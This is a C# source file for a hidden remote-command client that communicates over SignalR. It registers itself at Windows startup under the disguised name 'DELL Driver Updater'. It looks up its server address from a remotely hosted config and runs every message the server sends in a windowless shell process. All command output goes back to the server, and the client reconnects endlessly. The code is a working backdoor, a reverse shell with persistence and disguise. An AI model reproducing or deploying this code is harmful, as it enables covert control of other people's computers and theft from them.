﻿using Microsoft.AspNetCore.SignalR.Client;
using System.Diagnostics;
using System.Text.Json;
using Microsoft.Win32;

namespace SignalrClient
{
    //在项目属性中，修改项目output type为windows application，就不会弹出console窗口。
    internal class Program
    {
        static HubConnection _HubConnection;
        static Process cmd = new Process();
        static string _url = "";

        static async Task Main(string[] args)
        {
            SetStartup();
            await GetIpAddressFromGitee();
            ConnectSignalr();
            //如果是Console程序，可以使用ReadLine来阻塞程序。
            //Console.ReadLine();
            //如果是Windows Application，必须在此处循环，防止应用程序执行后结束退出。
            while (true)
            {
                await Task.Delay(new TimeSpan(1, 0, 0, 0));
            }
        }

        //让程序随系统启动
        //https://stackoverflow.com/questions/674628/how-do-i-set-a-program-to-launch-at-startup
        static void SetStartup()
        {
            string appName = "DELL Driver Updater.exe";
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            rk.SetValue("DELL Driver Updater", AppDomain.CurrentDomain.BaseDirectory+appName);
            //停止自动启动
            //rk.DeleteValue(AppName, false);
        }

        static async void ConnectSignalr()
        {
            try
            {
                _HubConnection = new HubConnectionBuilder().WithUrl(_url).Build();
                _HubConnection.Closed += async (Exception ex) =>
                {
                    await _HubConnection.DisposeAsync();
                    await Task.Delay(3000);
                    CloseCmd();
                    ConnectSignalr();
                };
                _HubConnection.On<string>("ClientReceiveMessage", OnMessageReceived);
                StartCmd();
                await _HubConnection.StartAsync();
            }
            catch (Exception e)
            {
                await _HubConnection.DisposeAsync();
                await Task.Delay(3000);
                CloseCmd();
                ConnectSignalr();
            }

        }

        private static void OnMessageReceived(string message)
        {
            try
            {
                cmd.StandardInput.WriteLine(message);
            }
            catch { }

        }

        private static void CloseCmd()
        {
            try
            {
                cmd.StandardInput.Close();
                cmd.WaitForExit();
            }
            catch { }
        }

        private static void StartCmd()
        {
            cmd = new Process();

            cmd.StartInfo.FileName = System.Configuration.ConfigurationManager.AppSettings["Command"];
            cmd.StartInfo.WorkingDirectory = System.Configuration.ConfigurationManager.AppSettings["CmdWorkingDirectory"];
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardError = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;

            cmd.Start();

            cmd.OutputDataReceived += (sender, e) =>
            {
                //Console.WriteLine(e.Data);
                _HubConnection.InvokeAsync("ServerReceiveMessage", e.Data);
            };
            cmd.ErrorDataReceived += (sender, e) =>
            {
                //Console.WriteLine(e.Data);
                _HubConnection.InvokeAsync("ServerReceiveMessage", e.Data);
            };

            cmd.BeginOutputReadLine();
            cmd.BeginErrorReadLine();
        }

        private static async Task GetIpAddressFromGitee()
        {
            try
            {
                string url = System.Configuration.ConfigurationManager.AppSettings["GiteeServerInfoUrl"];
                using (HttpClient client = new HttpClient())
                {
                    HttpResponseMessage responseMessageGet = await client.GetAsync(url);
                    if (responseMessageGet.IsSuccessStatusCode)
                    {
                        string text = await responseMessageGet.Content.ReadAsStringAsync();
                        ServerInfoModel serverInfo = JsonSerializer.Deserialize<ServerInfoModel>(text);
                        string UrlTemplate = System.Configuration.ConfigurationManager.AppSettings["UrlTemplate"];
                        _url = UrlTemplate.Replace("{0}", serverInfo.ServerIpv4);
                    }
                    else
                    {
                        client.Dispose();
                        await Task.Delay(10 * 1000);
                        await GetIpAddressFromGitee();
                    }
                }
            }
            catch
            {
                await Task.Delay(10 * 1000);
                await GetIpAddressFromGitee();
            }

        }

    }
}
